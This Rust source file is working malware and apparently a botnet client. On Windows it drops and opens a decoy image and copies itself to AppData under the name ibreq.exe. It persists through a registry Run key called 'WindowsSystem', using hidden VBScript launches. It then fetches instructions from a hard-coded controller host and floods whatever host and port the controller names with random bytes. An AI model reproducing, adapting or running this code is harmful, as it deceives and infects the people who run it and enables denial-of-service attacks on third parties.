#![allow(dead_code)]
pub mod config;
pub mod connection;
pub mod constant;
pub mod macros;
pub mod response;
pub mod util;

use config::{AppConfig, ControllerConfig};
use connection::create_stream;
use constant::*;
use response::Response;
use std::error;
use util::{gen_random_byte, parse_config};

pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

pub fn fetch_controller_config() -> Result<ControllerConfig> {
  let app_conf = get_app_config().unwrap_or_default();
  let headers = format!(
    "{} {} HTTP/1.1\nAccept: */*\nx-client-token: {}{}",
    CONF_METHOD, CONF_PATH, app_conf.token, BODY_SEPARATOR
  );
  let mut res = String::new();
  let mut stream = create_stream(
    CONF_SSL.parse().unwrap(),
    CONF_HOST,
    CONF_PORT.parse().unwrap(),
  )?;

  stream.w(&headers.as_bytes())?;
  stream.r(&mut res)?;

  let res: Response = Response::from(res);

  let conf = parse_config(&res.decrypted_body());
  let conf = ControllerConfig::from(conf);

  debug!("Done fetching config {:?}.", conf);

  Ok(conf)
}

pub fn call(conf: &ControllerConfig) -> Result<Response> {
  let mut stream = create_stream(conf.ssl, &conf.host, conf.port)?;
  let body: Vec<u8> = vec![0; conf.content_length as usize]
    .iter()
    .map(|_| gen_random_byte())
    .collect();
  let mut res = String::new();

  stream.w(conf.headers.as_bytes())?;
  stream.w("\n\n".as_bytes())?;

  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
      stream.w(&chunk)?;
    }
  } else {
    stream.w(&body)?;
  }

  stream.w(&[0; 1])?;
  stream.r(&mut res)?;

  debug!("Done calling {}...", conf.get_addr());

  return Ok(Response::from(res));
}

#[cfg(target_os = "windows")]
pub fn setup() -> Result<()> {
  use rand::Rng;
  use rand::{distributions::Alphanumeric, thread_rng};
  use std::{
    env, fs,
    process::{exit, Command},
  };
  let home_path = env::home_dir().unwrap().display().to_string();
  let current_path = std::env::current_exe().unwrap().display().to_string();
  let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
  let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
  let token: String = thread_rng().sample_iter(&Alphanumeric).take(32).collect();

  if current_path == target_path {
    return Ok(());
  }

  // Copy image and open
  {
    let mut image_path = current_path.clone().replace(".exe", "");

    if !image_path.ends_with(".jpg") {
      image_path.push_str(".jpg");
    }

    fs::write(&image_path, PLACEHOLDER_BUF)?;
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {}", 0, false
    "#,
      image_path
    );
    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;

    fs::copy(&current_path, &target_path)?;
  }

  // Run add and register as autorun
  {
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {target_path}", 0, false
      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
    "#,
      target_path = target_path
    );
    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;

    // Create config file
    let conf_content = format!("token={};", token);
    fs::write(&conf_path, &conf_content)?;
  }

  exit(0);
}

#[cfg(not(target_os = "windows"))]
pub fn setup() -> Result<()> {
  Ok(())
}

#[cfg(target_os = "windows")]
pub fn get_app_config() -> Result<AppConfig> {
  use std::{env, fs};

  let home_path = env::home_dir().unwrap().display().to_string();
  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
  let conf = parse_config(&fs::read_to_string(&conf_path)?);
  let conf = AppConfig::from(conf);

  Ok(conf)
}

#[cfg(not(target_os = "windows"))]
pub fn get_app_config() -> Result<AppConfig> {
  Ok(AppConfig::default())
}
